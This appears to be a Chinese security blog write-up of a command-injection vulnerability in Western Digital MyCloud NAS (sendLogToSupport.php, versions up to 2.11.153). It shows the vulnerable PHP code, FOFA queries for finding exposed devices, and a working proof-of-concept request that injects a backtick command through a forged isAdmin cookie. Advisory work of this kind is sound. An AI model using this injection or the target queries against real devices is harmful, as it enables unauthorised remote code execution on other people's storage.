---
title: "西部数码 NAS php/sendLogToSupport.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html
asset_dir: assets/西部数码-nas-phpsendlogtosupport.php-命令执行漏洞
---

# 西部数码 NAS php/sendLogToSupport.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/3 16:30
- 592浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

MyCloud NAS

软件

网页服务器

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS sendLogToSupport.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `sendLogToSupport.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);
```

深入探索

服务器安全服务

授权

Docker加速服务

从 `$_COOKIE` 中获取 `username` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 `exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

计算机驱动器和存储设备

# 漏洞复现

```
GET /web/php/sendLogToSupport.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin`sleep 3`
```

[![西部数码 NAS php/sendLogToSupport.php 命令执行漏洞](images/img-001-81f7391dfb7a.webp)](https://image.mrxn.net/a4cb9901ff544f2c8dfddec375dbd55a.webp)

成功延时 3 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
